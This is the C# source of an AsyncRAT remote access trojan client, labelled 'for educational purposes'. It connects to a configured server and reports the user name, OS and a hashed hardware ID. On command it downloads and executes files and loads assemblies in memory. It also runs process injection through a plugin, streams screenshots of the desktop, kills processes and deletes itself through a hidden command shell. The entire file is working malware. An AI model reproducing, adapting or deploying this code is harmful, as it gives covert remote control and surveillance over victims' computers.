using AsyncRAT_Sharp.MessagePack;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.Devices;
using System;
using System.Diagnostics;
using System.IO;
using System.Net.Sockets;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using StreamLibrary;
using StreamLibrary.UnsafeCodecs;
using System.Drawing;
using System.Drawing.Imaging;
using System.Management;
using System.Linq;

//       │ Author     : NYAN CAT
//       │ Name       : AsyncRAT // Simple Socket

//       Contact Me   : https://github.com/NYAN-x-CAT

//       This program Is distributed for educational purposes only.


namespace Client
{
    /// The Main Settings
    class Settings
    {
        public static readonly string IP = "127.0.0.1";
        public static readonly int Port = 6606;
        public static readonly string Version = "0.2.3";
    }

    /// The Main Class
    /// Contains all methods for socket and reading the packets
    class Program
    {
        public static Socket Client { get; set; }
        private static byte[] Buffer { get; set; }
        private static long Buffersize { get; set; }
        private static bool BufferRecevied { get; set; }
        private static System.Threading.Timer Tick { get; set; }
        private static MemoryStream MS { get; set; }
        private static object SendSync { get; set; }

        static void Main(string[] args)
        {
            InitializeClient();
            while (true)
            {
                Thread.Sleep(1000);
            }
        }

        /// Initialization variables and connect to socket.
        public static void InitializeClient()
        {
            try
            {
                Client = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp)
                {
                    ReceiveBufferSize = 50 * 1024,
                    SendBufferSize = 50 * 1024,
                    ReceiveTimeout = -1,
                    SendTimeout = -1,
                };
                Client.Connect(Settings.IP, Settings.Port);
                Debug.WriteLine("Connected!");
                Buffer = new byte[1];
                Buffersize = 0;
                BufferRecevied = false;
                MS = new MemoryStream();
                SendSync = new object();
                BeginSend(SendInfo());
                TimerCallback T = Ping;
                Tick = new System.Threading.Timer(T, null, new Random().Next(30 * 1000, 60 * 1000), new Random().Next(30 * 1000, 60 * 1000));
                Client.BeginReceive(Buffer, 0, Buffer.Length, SocketFlags.None, ReadServertData, null);
            }
            catch
            {
                Debug.WriteLine("Disconnected!");
                Thread.Sleep(new Random().Next(1 * 1000, 6 * 1000));
                Reconnect();
            }
        }

        /// Cleanup everything and start to connect again.
        public static void Reconnect()
        {
            if (Client.Connected) return;

            Tick?.Dispose();

            try
            {
                Client?.Close();
                Client?.Dispose();
            }
            catch { }

            MS?.Dispose();

            InitializeClient();
        }

        /// Method to send our ID to server's listview.
        private static byte[] SendInfo()
        {
            MsgPack msgpack = new MsgPack();
            msgpack.ForcePathObject("Packet").AsString = "ClientInfo";
            msgpack.ForcePathObject("HWID").AsString = HWID();
            msgpack.ForcePathObject("User").AsString = Environment.UserName.ToString();
            msgpack.ForcePathObject("OS").AsString = new ComputerInfo().OSFullName.ToString() + " " + Environment.Is64BitOperatingSystem.ToString().Replace("True", "64bit").Replace("False", "32bit");
            return msgpack.Encode2Bytes();
        }

        private static string HWID()
        {
            StringBuilder sb = new StringBuilder();
            sb.Append(Environment.UserDomainName);
            sb.Append(Environment.UserName);
            sb.Append(Environment.MachineName);
            sb.Append(Environment.Version);
            return GetHash(sb.ToString());
        }

        private static string GetHash(string strToHash)
        {
            MD5CryptoServiceProvider md5Obj = new MD5CryptoServiceProvider();
            byte[] bytesToHash = Encoding.ASCII.GetBytes(strToHash);
            bytesToHash = md5Obj.ComputeHash(bytesToHash);
            StringBuilder strResult = new StringBuilder();
            foreach (byte b in bytesToHash)
                strResult.Append(b.ToString("x2"));
            return strResult.ToString().Substring(0, 12).ToUpper();
        }

        /// get the length of the buffer by reading byte by byte [1]
        /// until we get the full size.
        public static void ReadServertData(IAsyncResult ar)
        {
            try
            {
                if (Client.Connected == false)
                {
                    Reconnect();
                    return;
                }

                int Recevied = Client.EndReceive(ar);

                if (Recevied > 0)
                {

                    if (BufferRecevied == false)
                    {
                        if (Buffer[0] == 0)
                        {
                            Buffersize = Convert.ToInt64(Encoding.UTF8.GetString(MS.ToArray()));
                            Debug.WriteLine("///  Buffersize: " + Buffersize.ToString() + "Bytes  ///");
                            MS.Dispose();
                            MS = new MemoryStream();
                            if (Buffersize > 0)
                            {
                                Buffer = new byte[Buffersize - 1];
                                BufferRecevied = true;
                            }
                        }
                        else
                        {
                            MS.Write(Buffer, 0, Buffer.Length);
                        }
                    }
                    else
                    {
                        MS.Write(Buffer, 0, Recevied);
                        if (MS.Length == Buffersize)
                        {
                            ThreadPool.QueueUserWorkItem(Read, MS.ToArray());
                            MS.Dispose();
                            MS = new MemoryStream();
                            Buffer = new byte[1];
                            Buffersize = 0;
                            BufferRecevied = false;
                        }
                        else
                        {
                            Buffer = new byte[Buffersize - MS.Length];
                        }
                    }
                    Client.BeginReceive(Buffer, 0, Buffer.Length, SocketFlags.None, ReadServertData, null);
                }
                else
                {
                    Reconnect();
                }
            }
            catch
            {
                Reconnect();
            }
        }

        /// Handle the packet
        public static void Read(object Data)
        {
            try
            {
                MsgPack unpack_msgpack = new MsgPack();
                unpack_msgpack.DecodeFromBytes((byte[])Data);
                switch (unpack_msgpack.ForcePathObject("Packet").AsString)
                {
                    case "sendMessage":
                        {
                            MessageBox.Show(unpack_msgpack.ForcePathObject("Message").AsString);
                        }
                        break;

                    case "Ping":
                        {
                            Debug.WriteLine("Server Pinged me " + unpack_msgpack.ForcePathObject("Message").AsString);
                        }
                        break;

                    case "sendFile":
                        {
                            Received();
                            string FullPath = Path.GetTempFileName() + unpack_msgpack.ForcePathObject("Extension").AsString;
                            unpack_msgpack.ForcePathObject("File").SaveBytesToFile(FullPath);
                            Process.Start(FullPath);
                            if (unpack_msgpack.ForcePathObject("Update").AsString == "true")
                            {
                                Uninstall();
                            }
                        }
                        break;

                    case "sendMemory":
                        {
                            Received();
                            byte[] Buffer = unpack_msgpack.ForcePathObject("File").GetAsBytes();
                            string Injection = unpack_msgpack.ForcePathObject("Inject").AsString;
                            byte[] Plugin = unpack_msgpack.ForcePathObject("Plugin").GetAsBytes();
                            object[] parameters = new object[] { Buffer, Injection, Plugin };
                            Thread thread = null;
                            if (Injection.Length == 0)
                            {
                                thread = new Thread(new ParameterizedThreadStart(SendToMemory));
                            }
                            else
                            {
                                thread = new Thread(new ParameterizedThreadStart(RunPE));
                            }
                            thread.Start(parameters);
                        }
                        break;

                    case "close":
                        {
                            try
                            {
                                Client.Shutdown(SocketShutdown.Both);
                            }
                            catch { }
                            Environment.Exit(0);
                        }
                        break;

                    case "uninstall":
                        {
                            Uninstall();
                        }
                        break;

                    case "remoteDesktop":
                        {
                            switch (unpack_msgpack.ForcePathObject("Option").AsString)
                            {
                                case "false":
                                    {
                                        RemoteDesktop_Status = false;
                                    }
                                    break;

                                case "true":
                                    {
                                        RemoteDesktop_Status = true;
                                        RemoteDesktop();
                                    }
                                    break;
                            }
                        }
                        break;

                    case "processManager":
                        {
                            switch (unpack_msgpack.ForcePathObject("Option").AsString)
                            {
                                case "List":
                                    {
                                        ProcessManager();
                                    }
                                    break;

                                case "Kill":
                                    {
                                        ProcessKill(Convert.ToInt32(unpack_msgpack.ForcePathObject("ID").AsString));
                                    }
                                    break;
                            }
                        }
                        break;
                }
            }
            catch { }
        }

        private static void Received()
        {
            MsgPack msgpack = new MsgPack();
            msgpack.ForcePathObject("Packet").AsString = "Received";
            BeginSend(msgpack.Encode2Bytes());
        }

        private static void ProcessKill(int ID)
        {
            foreach (var process in Process.GetProcesses())
            {
                try
                {
                    if (process.Id == ID)
                    {
                        process.Kill();
                    }
                }
                catch { };
            }
            ProcessManager();
        }

        private static void ProcessManager()
        {
            StringBuilder sb = new StringBuilder();
            var query = "SELECT ProcessId, Name, ExecutablePath FROM Win32_Process";
            using (var searcher = new ManagementObjectSearcher(query))
            using (var results = searcher.Get())
            {
                var processes = results.Cast<ManagementObject>().Select(x => new
                {
                    ProcessId = (UInt32)x["ProcessId"],
                    Name = (string)x["Name"],
                    ExecutablePath = (string)x["ExecutablePath"]
                });
                foreach (var p in processes)
                {
                    if (File.Exists(p.ExecutablePath))
                    {
                        string name = p.ExecutablePath;
                        string key = p.ProcessId.ToString();
                        Icon icon = Icon.ExtractAssociatedIcon(p.ExecutablePath);
                        Bitmap bmpIcon = icon.ToBitmap();
                        using (MemoryStream ms = new MemoryStream())
                        {
                            bmpIcon.Save(ms, ImageFormat.Png);
                            sb.Append(name + "-=>" + key + "-=>" + Convert.ToBase64String(ms.ToArray()) + "-=>");
                        }
                    }
                }
            }
            MsgPack msgpack = new MsgPack();
            msgpack.ForcePathObject("Packet").AsString = "processManager";
            msgpack.ForcePathObject("Message").AsString = sb.ToString();
            BeginSend(msgpack.Encode2Bytes());
        }

        private static bool RemoteDesktop_Status { get; set; }
        private static void RemoteDesktop()
        {
            try
            {
                IUnsafeCodec unsafeCodec = new UnsafeStreamCodec(80);
                while (RemoteDesktop_Status == true)
                {
                    Thread.Sleep(1);
                    if (!Client.Connected) break;
                    Bitmap bmp = CaptureScreen();
                    Rectangle rect = new Rectangle(0, 0, bmp.Width, bmp.Height);
                    Size size = new Size(bmp.Width, bmp.Height);
                    BitmapData bmpData = bmp.LockBits(new Rectangle(0, 0, bmp.Width, bmp.Height), ImageLockMode.ReadWrite, bmp.PixelFormat);

                    using (MemoryStream stream = new MemoryStream(1000000))
                    {
                        unsafeCodec.CodeImage(bmpData.Scan0, rect, size, bmp.PixelFormat, stream);
                        if (stream.Length > 0)
                        {
                            MsgPack msgpack = new MsgPack();
                            msgpack.ForcePathObject("Packet").AsString = "remoteDesktop";
                            msgpack.ForcePathObject("Stream").SetAsBytes(stream.ToArray());
                            BeginSend(msgpack.Encode2Bytes());
                        }
                    }
                    bmp.UnlockBits(bmpData);
                    bmp.Dispose();
                }
            }
            catch { }
        }

        private static Bitmap CaptureScreen()
        {
            Rectangle rect = Screen.AllScreens[0].WorkingArea;
            try
            {
                Bitmap bmpScreenshot = new Bitmap(rect.Width, rect.Height, PixelFormat.Format32bppArgb);
                Graphics gfxScreenshot = Graphics.FromImage(bmpScreenshot);
                gfxScreenshot.CopyFromScreen(0, 0, 0, 0, new Size(bmpScreenshot.Width, bmpScreenshot.Height), CopyPixelOperation.SourceCopy);
                gfxScreenshot.Dispose();
                return bmpScreenshot;
            }
            catch { return new Bitmap(rect.Width, rect.Height); }
        }


        private static void Uninstall()
        {
            ProcessStartInfo Del = null;
            try
            {
                Del = new ProcessStartInfo()
                {
                    Arguments = "/C choice /C Y /N /D Y /T 1 & Del " + Process.GetCurrentProcess().MainModule.FileName,
                    WindowStyle = ProcessWindowStyle.Hidden,
                    CreateNoWindow = true,
                    FileName = "cmd.exe"
                };

                Client.Shutdown(SocketShutdown.Both);
                Client.Close();
            }
            catch { }
            finally
            {
                Process.Start(Del);
                Environment.Exit(0);
            }
        }

        private static void SendToMemory(object obj)
        {
            object[] Obj = (object[])obj;
            byte[] Buffer = (byte[])Obj[0];
            Assembly Loader = Assembly.Load(Buffer);
            object[] Parameters = null;
            if (Loader.EntryPoint.GetParameters().Length > 0)
            {
                Parameters = new object[] { new string[] { null } };
            }
            Loader.EntryPoint.Invoke(null, Parameters);
        }

        private static void RunPE(object obj)
        {
            try
            {
                object[] Parameters = (object[])obj;
                byte[] File = (byte[])Parameters[0];
                string Injection = Convert.ToString(Parameters[1]);
                byte[] Plugin = (byte[])Parameters[2];
                Assembly Loader = Assembly.Load(Plugin);
                Loader.GetType("Plugin.Program").GetMethod("Run").Invoke(null, new object[] { File, Path.Combine(RuntimeEnvironment.GetRuntimeDirectory(), Injection) });
            }
            catch { }
        }

        public static void Ping(object obj)
        {
            MsgPack msgpack = new MsgPack();
            msgpack.ForcePathObject("Packet").AsString = "Ping";
            msgpack.ForcePathObject("Message").AsString = DateTime.Now.ToLongTimeString().ToString();
            BeginSend(msgpack.Encode2Bytes());
        }

        /// Send
        /// adding the buffersize in the beginning of the stream
        public static void BeginSend(byte[] buffer)
        {
            lock (SendSync)
            {
                if (Client.Connected)
                {
                    try
                    {
                        using (MemoryStream MS = new MemoryStream())
                        {
                            byte[] buffersize = Encoding.UTF8.GetBytes(buffer.Length.ToString() + Strings.ChrW(0));
                            MS.Write(buffersize, 0, buffersize.Length);
                            MS.Write(buffer, 0, buffer.Length);

                            Client.Poll(-1, SelectMode.SelectWrite);
                            Client.BeginSend(MS.ToArray(), 0, (int)(MS.Length), SocketFlags.None, EndSend, null);
                        }
                    }
                    catch
                    {
                        Reconnect();
                    }
                }
            }
        }

        public static void EndSend(IAsyncResult ar)
        {
            try
            {
                Client.EndSend(ar);
            }
            catch
            {
                Reconnect();
            }
        }
    }
}